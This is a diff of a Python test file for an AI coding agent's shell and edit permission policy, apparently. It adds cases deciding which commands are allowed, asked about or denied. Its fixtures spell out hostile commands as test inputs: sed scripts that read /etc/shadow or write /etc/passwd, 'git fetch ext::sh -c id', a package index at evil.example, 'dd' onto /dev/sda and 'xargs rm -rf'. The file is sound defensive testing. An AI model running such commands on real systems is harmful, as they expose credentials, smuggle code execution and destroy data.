@@ -55,6 +55,7 @@ from lup.policy.kernel.decision import (
     SANDBOX_ESCALATION_UNSUPPORTED,
     SANDBOX_TRAPPED_REASON,
     SandboxPlacement,
+    escalation_offer,
     sandbox_escaped,
 )
 from lup.policy.kernel.edit import decide_edit
@@ -210,10 +211,17 @@ which is what the shell fixtures below are written against."""
 SHELL_POLICY_CASES = [
     DecisionCase(input="env MODE=test python script.py", effect="deny"),
     DecisionCase(input="uv run --with requests python -c 'x'", effect="deny"),
-    # A scratch root is gitignored, so a script there reaches no reviewer and
-    # no diff; the escalation ladder routes one-off work to devtools instead.
-    DecisionCase(input="uv run pytest | uv run python tmp/oneoff.py", effect="deny"),
-    DecisionCase(input="uv run python tmp/oneoff.py", effect="deny"),
+    # A script file is the ladder's rung for computing something once, and it
+    # is allowed wherever it sits: the refusal is about inline code leaving
+    # nothing behind to read, which a file does not do. A scratch root reaches
+    # no reviewer, but a one-off nobody reads again costs a reviewer nothing,
+    # and the session running it is contained.
+    DecisionCase(input="uv run pytest | uv run python tmp/oneoff.py", effect="allow"),
+    DecisionCase(input="uv run python tmp/oneoff.py", effect="allow"),
+    # The flags keep the refusal, because each of them is a program with no
+    # file to open afterwards.
+    DecisionCase(input="uv run python -m http.server", effect="deny"),
+    DecisionCase(input="uv run python", effect="deny"),
     DecisionCase(input="find . -name '*.py' | xargs grep TODO", effect="allow"),
     DecisionCase(input="echo x | xargs rm -rf", effect="ask"),
     DecisionCase(input="cd /tmp/worktree && uv run pytest", effect="allow"),
@@ -717,6 +725,23 @@ SHELL_POLICY_CASES = [
     DecisionCase(input="GIT_SSH_COMMAND=./x git fetch origin", effect="ask"),
     DecisionCase(input="git fetch ext::sh -c id", effect="ask"),
     DecisionCase(input="uv run --with evil pytest", effect="ask"),
+    # The same flag in front of an interpreter, which is the likelier
+    # spelling of the two and the one that was allowed. The gate existed and
+    # sat *below* the interpreter branch, so that branch answered first:
+    # `--with evil pytest` asked while `--with evil python x.py` did not, and
+    # the difference was ordering rather than judgement. The bare rung stays
+    # open beside it, because a named script is what the ladder points at.
+    DecisionCase(input="uv run --with evil python script.py", effect="ask"),
+    DecisionCase(
+        input="uv run --with-requirements r.txt python script.py", effect="ask"
+    ),
+    DecisionCase(input="uv run --with-editable . python script.py", effect="ask"),
+    DecisionCase(input="uv run --env-file .env python script.py", effect="ask"),
+    DecisionCase(input="uv run python script.py", effect="allow"),
+    # And the refusal still outranks the ask. Hoisting the flag check above
+    # the interpreter branch softened this one from deny to ask, which is a
+    # reviewability rule being answered by a supply-chain question.
+    DecisionCase(input="uv run --with requests python -c 'x'", effect="deny"),
     # Unknown words behind a literal blessed uv run target only reach that
     # target's argv; at or before the target they keep the opaque gate.
     DecisionCase(
@@ -1696,6 +1721,12 @@ def test_only_an_escalable_placement_reads_what_the_call_already_asked() -> None
         assert sandbox_escaped("escalable", spent) is spent
 
 
+def test_an_escalation_offer_only_reaches_a_tool_that_can_spend_it() -> None:
+    """A permission is not an offer when the tool has no escape field."""
+    assert escalation_offer("escalable", "fine", spendable=True) == "fine"
+    assert escalation_offer("escalable", "fine", spendable=False) == ""
+
+
 def test_fetch_policy_normalizes_origin_and_rejects_lookalikes() -> None:
     policy = FetchPolicy(
         allowed=[
@@ -2272,6 +2303,45 @@ def test_the_toolchain_carries_its_own_escape_and_is_refused_without_one() -> No
     assert "only a runtime without that channel" in trapped.reason
 
 
+def test_a_help_probe_keeps_the_placement_its_target_declares() -> None:
+    """Printing usage is a verdict about the effect and not about the place.
+
+    The toolchain above is declared ``outside`` because it opens agent
+    sessions, and asking it for its own usage is the same program under the
+    same declaration. Answered above the walk the probe returned a bare
+    allow, and the placement went with it: `uv run lup-devtools dev check`
+    was placed ``outside`` while `uv run lup-devtools --help`, one word
+    apart, was placed ``ambient`` — as was every other help probe in the
+    vocabulary, whatever its depth. So the probe now replaces the effect and
+    the walk still answers for the placement.
+    """
+    placed = ShellPolicy(
+        SHELL_RULES,
+        sandbox_active=True,
+        escapable=True,
+        runner_targets=FIXTURE_RUNNER_TARGETS,
+    ).decide(ShellCommand(command="uv run lup-devtools --help"))
+
+    assert placed.effect == "allow"
+    assert placed.sandbox == "outside"
+
+
+def test_a_help_probe_of_an_unclassified_command_still_reads() -> None:
+    """The probe's own reason for existing, which the placement must not cost.
+
+    An unclassified command is refused, and being able to read its usage is
+    how an agent finds the form that is not. Taking the placement from the
+    walk leaves that untouched: nothing declares this command, so the walk
+    declares no placement either.
+    """
+    read = ShellPolicy(SHELL_RULES, runner_targets=FIXTURE_RUNNER_TARGETS).decide(
+        ShellCommand(command="frobnicate --help")
+    )
+
+    assert read.effect == "allow"
+    assert read.sandbox == "ambient"
+
+
 def test_non_interactive_denials_do_not_prescribe_escalation() -> None:
     """Codex hooks cannot complete the approval flow, so they never name it."""
     interactive = ShellPolicy(SHELL_RULES).decide(
@@ -2285,6 +2355,24 @@ def test_non_interactive_denials_do_not_prescribe_escalation() -> None:
     assert blocked.effect == "deny"
     assert "escalate" not in blocked.reason
     assert "allowed vocabulary" in blocked.reason
+
+
+def test_a_reviewed_worker_is_told_the_route_it_actually_has() -> None:
+    """Non-interactive and alone are different states that shared one answer.
+
+    A worker holds a question mailbox reaching the human supervising its run,
+    so telling it to reshape the command names the only route it has as
+    unavailable — and measured in #202, it did what anybody would and queued a
+    *material question* instead, parking the whole run on a decision nobody
+    needed to make. A genuinely headless run still gets the reshape, because
+    naming a route that is not there is the same failure pointed the other way.
+    """
+    relayed = ShellPolicy(SHELL_RULES, interactive=False, relayed=True).decide(
+        ShellCommand(command="git push --delete origin feat")
+    )
+    assert relayed.effect == "deny"
+    assert "request_allowance" in relayed.reason
+    assert "escalate" not in relayed.reason
 
 
 def test_claude_decoder_marks_unsandboxed_escapes() -> None:
@@ -3489,3 +3577,289 @@ def test_resolving_a_note_into_a_claim_is_still_not_a_deletion() -> None:
     )
 
     assert "removes inline review feedback" not in decision.reason
+
+
+def test_a_read_only_form_defined_by_absence_is_recognized_as_a_read() -> None:
+    """The negative half of the effect-versus-token gap, closed.
+
+    Every other de-escalation here needs a word to be *present*. `dd` writes
+    when handed an `of=` and reads to stdout without one, so its read-only
+    form is the invocation carrying nothing extra -- which no membership test
+    can name, and which therefore stopped for approval every time.
+    """
+    policy = ShellPolicy(SHELL_RULES)
+
+    def effect(command: str) -> str:
+        return policy.decide(ShellCommand(command=command)).effect
+
+    assert effect("dd if=/etc/hosts") == "allow"
+    assert effect("dd if=disk.img bs=1M count=10") == "allow"
+    assert effect("dd if=a of=b") == "ask"
+    assert effect("dd if=a of=/dev/sda") == "ask"
+
+
+def test_absence_is_only_concluded_from_words_it_could_actually_read() -> None:
+    """A verdict reached from absence has to know it saw everything.
+
+    `dd if=$X` word-splits at expansion, so `$X` holding a space becomes a
+    second word that can be `of=`. A test asking whether a marker is missing
+    cannot tell that from a marker it could not read, so an illegible word
+    keeps the ask -- a stricter bar than the positive tests need, and
+    measured allowing until it was raised.
+    """
+    policy = ShellPolicy(SHELL_RULES)
+
+    def effect(command: str) -> str:
+        return policy.decide(ShellCommand(command=command)).effect
+
+    assert effect("dd if=$SOMEVAR") == "ask"
+    assert effect("dd if=a of=$X") == "ask"
+
+
+def test_asking_git_its_own_version_is_not_an_unclassified_subcommand() -> None:
+    """`git version` was allowed and `git --version` denied, for the same question.
+
+    The flag spelling carries no subcommand at all, so it reached the default
+    deny and answered "this git subcommand is not classified" about a command
+    line holding none.
+    """
+    policy = ShellPolicy(SHELL_RULES)
+
+    def effect(command: str) -> str:
+        return policy.decide(ShellCommand(command=command)).effect
+
+    assert effect("git --version") == "allow"
+    assert effect("git --help") == "allow"
+    assert effect("git version") == "allow"
+    # Still a subcommand-gated command everywhere else. The de-escalation
+    # needs *every* argument to be one of the declared flags, so a real
+    # subcommand standing beside one would not qualify either.
+    assert effect("git gc") == "deny"
+    assert effect("git filter-branch") == "deny"
+    assert effect("git --exec-path=/x status") == "ask"
+
+
+def test_editing_a_compiled_plugin_tree_is_refused_by_the_file_gate_too() -> None:
+    """The refusal the shell path already gave, given to Edit and Write.
+
+    A plugin tree is a build product: the change is reverted by the next
+    generation and never reaches the runtime that already loaded it. The
+    shell path said so; an Edit to the same file was judged by the ordinary
+    lattice, which has no verdict that is right here — an allow writes
+    something about to be overwritten, and an ask puts a question to a human
+    whose only correct answer is "edit the source instead".
+
+    Both runtimes' trees, because which tree a write lands in is the same
+    question whichever one is running.
+    """
+    for tree in (".claude", ".codex"):
+        decision = decide_edit(
+            f"{tree}/plugins/lup/hooks/runtime/policy_data.py",
+            "SHELL_RULES = []",
+            "SHELL_RULES = [1]",
+            path_exists=True,
+            path_rules=[],
+            antipattern_rows=[],
+            python_source=True,
+        )
+        assert decision.effect == "deny", tree
+        assert "compiled from typed source" in decision.reason, tree
+
+
+def test_a_note_whose_words_stay_in_the_file_was_moved_rather_than_deleted() -> None:
+    """Relocating a note is the repair, not the loss.
+
+    A note routinely lands against the wrong declaration — most often in a
+    merge, where both sides added at one spot — and the gate read any edit
+    dropping the marker line as a deletion. Judged on the words instead: a
+    marker whose text still appears in the file has been moved, which makes
+    the order the spelling of a move.
+    """
+    note = "# lup: the base is read from the wrong checkout"
+    both = f"{note}\ndef first(): ...\n\n\n{note}\ndef second(): ...\n"
+    one = f"def first(): ...\n\n\n{note}\ndef second(): ...\n"
+
+    decision = decide_edit(
+        "a.py",
+        both,
+        one,
+        path_exists=True,
+        path_rules=[],
+        antipattern_rows=[],
+        python_source=True,
+    )
+
+    assert decision.effect != "deny", decision.reason
+
+
+def test_a_note_whose_words_leave_the_file_is_still_a_deletion() -> None:
+    """The gate that was there all along, unchanged where it was right."""
+    note = "# lup: the base is read from the wrong checkout"
+    decision = decide_edit(
+        "a.py",
+        f"{note}\ndef first(): ...\n",
+        "def first(): ...\n",
+        path_exists=True,
+        path_rules=[],
+        antipattern_rows=[],
+        python_source=True,
+    )
+
+    assert decision.effect == "deny"
+    assert "removes inline review feedback" in decision.reason
+    assert "dev comments --withdraw" in decision.reason
+
+
+def test_moving_one_note_does_not_cover_deleting_another() -> None:
+    """The difference is over the words, so a distinct note is still lost."""
+    moved = "# lup: the base is read from the wrong checkout"
+    other = "# lup: this counts every concern holding a commit"
+    decision = decide_edit(
+        "a.py",
+        f"{moved}\ndef first(): ...\n\n\n{moved}\n{other}\ndef second(): ...\n",
+        f"def first(): ...\n\n\n{moved}\ndef second(): ...\n",
+        path_exists=True,
+        path_rules=[],
+        antipattern_rows=[],
+        python_source=True,
+    )
+
+    assert decision.effect == "deny"
+
+
+def test_installing_asks_and_the_verbs_that_fetch_nothing_do_not() -> None:
+    """Where the line sits, and that clearing a cache was never on it.
+
+    Fetching a package runs its build code, which is the escape a
+    supply-chain compromise arrives through — so both verbs that install ask,
+    and the packages having been declared earlier does not answer it, because
+    what changed is what the index now serves. Writing a lockfile and
+    dropping a dependency fetch nothing to execute, and a cache is rebuilt by
+    the command that reads it. That verb reached no rule at all, which is why
+    a refresh line asked with it among the reasons.
+    """
+    policy = ShellPolicy(SHELL_RULES)
+
+    def effect(command: str) -> str:
+        return policy.decide(ShellCommand(command=command)).effect
+
+    assert effect("uv add httpx") == "ask"
+    assert effect("uv sync --all-extras") == "ask"
+    assert effect("uv lock --upgrade-package lup") == "allow"
+    assert effect("uv cache clean lup") == "allow"
+    assert effect("uv remove ruff") == "allow"
+
+
+def test_a_verb_pointed_at_another_index_is_not_the_verb_it_rides_on() -> None:
+    """Naming a package source is a different act wearing the same word.
+
+    `uv lock` writes what this project declares — while nothing on the
+    command line redirects where packages come from, or removes the isolation
+    their build code runs in. Either makes the allow wrong, and an unreadable
+    word answers the same way, because absence is what is being tested.
+    """
+    policy = ShellPolicy(SHELL_RULES)
+
+    def effect(command: str) -> str:
+        return policy.decide(ShellCommand(command=command)).effect
+
+    assert effect("uv lock") == "allow"
+    assert effect("uv lock --index-url http://evil.example/simple") == "ask"
+    assert effect("uv lock --extra-index-url http://evil.example/simple") == "ask"
+    assert effect("uv lock -f /tmp/wheels") == "ask"
+    assert effect("uv lock --no-build-isolation") == "ask"
+    assert effect("uv remove ruff --index https://mirror.example") == "ask"
+    assert effect("uv lock $FLAGS") == "ask"
+
+
+def test_a_type_check_through_a_package_runner_is_the_read_it_is() -> None:
+    """Both runners name the compiler beneath them, so a verify line passes.
+
+    A verify line ending in `npx tsc --noEmit` asked about its last segment
+    and, since segments join, made the whole line ask — a question about
+    running the type checker.
+    """
+    policy = ShellPolicy(SHELL_RULES)
+
+    def effect(command: str) -> str:
+        return policy.decide(ShellCommand(command=command)).effect
+
+    for runner in ("npx", "bunx"):
+        assert effect(f"{runner} tsc --noEmit") == "allow", runner
+        assert effect(f"{runner} tsc --version") == "allow", runner
+        # The runner itself still asks: what it fetches is not bounded by the
+        # command, and only the compiler is named beneath it.
+        assert effect(f"{runner} create-react-app app") == "ask", runner
+        assert effect(f"{runner} tsc --outDir build") == "ask", runner
+
+    # Composed the way it was met: segments join, so one asking segment made
+    # a whole verify line ask.
+    assert effect("git status --short && cd frontend && npx tsc --noEmit") == "allow"
+
+
+def test_rewriting_a_restorable_file_costs_what_deleting_it_costs(
+    tmp_path: Path,
+) -> None:
+    """An in-place rewrite is judged on its files, the way a delete already is.
+
+    Two objections wore one refusal here, and only one survives a boundary
+    beneath it. *Being wrong is unrepairable* is answered by the files: a
+    committed file with no uncommitted change costs a checkout and no
+    information, and the whole change stands in the diff. *It walks past the
+    gates an edit is judged by* is not answered by anything, which is why the
+    grant says so and names `dev check`.
+    """
+    committed_tree(tmp_path, "notes.md", "other.md")
+    policy = ShellPolicy(SHELL_RULES, runner_targets=FIXTURE_RUNNER_TARGETS)
+
+    def decided(command: str) -> str:
+        return policy.decide(ShellCommand(command=command, cwd=tmp_path)).effect
+
+    assert decided("sed -i 's/body/text/' notes.md") == "allow"
+    assert decided("sed -i.bak 's/body/text/' notes.md other.md") == "allow"
+    assert decided("sed -ni 's/body/text/p' notes.md") == "allow"
+
+    # A file the host can vouch for nothing about costs whatever was in it.
+    (tmp_path / "dirty.md").write_text("uncommitted\n", encoding="utf-8")
+    assert decided("sed -i 's/a/b/' dirty.md") == "deny"
+    assert decided("sed -i 's/a/b/' absent.md") == "deny"
+    # Naming no file at all establishes nothing to be restorable.
+    assert decided("sed -i 's/a/b/'") == "deny"
+    # A word that names a different path at run time is not established either.
+    assert decided("sed -i 's/a/b/' $TARGET") == "deny"
+
+
+def test_an_in_place_rewrite_never_covers_a_protected_path(tmp_path: Path) -> None:
+    """Restorability answers what it costs, never who may replace it."""
+    committed_tree(tmp_path, "README.md", "notes.md")
+    policy = ShellPolicy(
+        SHELL_RULES,
+        path_rules=[human_owned_path_rule("README.md")],
+        runner_targets=FIXTURE_RUNNER_TARGETS,
+    )
+
+    def effect(command: str) -> str:
+        return policy.decide(ShellCommand(command=command, cwd=tmp_path)).effect
+
+    assert effect("sed -i 's/a/b/' notes.md") == "allow"
+    assert effect("sed -i 's/a/b/' README.md") == "ask"
+
+
+def test_an_in_place_rewrite_is_still_screened_for_what_the_script_does(
+    tmp_path: Path,
+) -> None:
+    """Recoverability says nothing about a script that writes or executes.
+
+    The two screens are independent: one asks what the named files cost, the
+    other what the script reaches. A grant on the first never opens the
+    second, which is what keeps `w` and `e` out of an allowed command.
+    """
+    committed_tree(tmp_path, "notes.md")
+    policy = ShellPolicy(SHELL_RULES, runner_targets=FIXTURE_RUNNER_TARGETS)
+
+    def effect(command: str) -> str:
+        return policy.decide(ShellCommand(command=command, cwd=tmp_path)).effect
+
+    assert effect("sed -i 's/a/b/w /etc/passwd' notes.md") != "allow"
+    assert effect("sed -i '1e cat /etc/shadow' notes.md") != "allow"
+    assert effect("sed -i -f script.sed notes.md") == "deny"
